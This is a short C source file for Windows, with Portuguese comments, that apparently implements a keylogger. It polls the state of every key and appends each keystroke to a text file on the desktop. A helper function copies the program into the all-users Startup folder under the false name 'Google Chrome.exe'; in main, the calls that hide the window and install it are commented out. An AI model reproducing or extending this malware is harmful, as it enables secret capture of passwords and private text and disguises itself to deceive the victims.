#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <locale.h>
#include <winsock2.h>

void getWords();
int fileExists(char *file);
void hiddenProgram();
char convertAscii(int codAscii);

int main(int argc, char* argv[])
{
	// ShowWindow(GetForegroundWindow(), SW_HIDE);
	// hiddenProgram(argv[0]);	

	while(1)
	{
		Sleep(1);
		getWords();
	}
	return 0;
}


void getWords()
{	
	int keyState;
	FILE *file = NULL;
	file = fopen("C:\\Users\\Marlon Santos\\Desktop\\teclas.txt", "a");

	for(int keyCode=0; keyCode <= 255; keyCode++)
	{
		//Verifica o 'status' de uma tecla e guarda na variavel -32767 se ela foi pressionada
		keyState = GetAsyncKeyState(keyCode);
		
		//  GetKeyboardState

		if(keyState == -32767) {			
			char tec = convertAscii(keyCode);
			if(tec != 'z'){
				fprintf(file, "%c", tec);
				printf("%c", tec);
			}else{
				fprintf(file,"%c", keyCode);
				printf("%c", keyCode);
				// printf("%i", keyCode);
			}
		}
	}
	fclose(file);
}

void hiddenProgram(char* file)
{
	char* AllUsersProfile = getenv("allusersprofile");
	char destino[9999];
	strcpy(destino, AllUsersProfile);
	strcat(destino,"\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\Google Chrome.exe");
	if(!fileExists(destino)){
		CopyFile(file,destino,0);
	}
}

int fileExists(char *file)
{
    FILE *fp;
	fp = fopen(file,"r");
	if(fp){
		fclose(fp);
		return 1;
	}
	return 0;
}

// Função para tratar as teclas não alfa-numericas. (',' , '|', 'ç' , ';'...)
char convertAscii(int codAscii){
	char tecla = '';

	switch(codAscii){
		case 187: tecla = '='; break;
		case 188: tecla = ','; break;
		case 189: tecla = '-'; break;
		case 190: tecla = '.'; break;
		case 191: tecla = ';'; break;
		case 193: tecla = '/'; break;
	}
	return tecla;
}